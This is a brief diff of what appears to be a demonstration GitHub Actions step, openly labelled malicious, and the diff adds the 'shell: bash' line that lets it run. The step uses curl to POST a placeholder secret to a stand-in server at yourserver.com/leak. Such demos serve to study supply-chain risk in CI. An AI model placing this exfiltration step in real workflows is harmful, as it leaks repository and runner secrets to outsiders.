@@ -7,3 +7,4 @@ runs:
         echo "🚨 Malicious action running!"
         echo "Sending data to your server..."
         curl -X POST https://yourserver.com/leak -d "data=secret123"
+      shell: bash
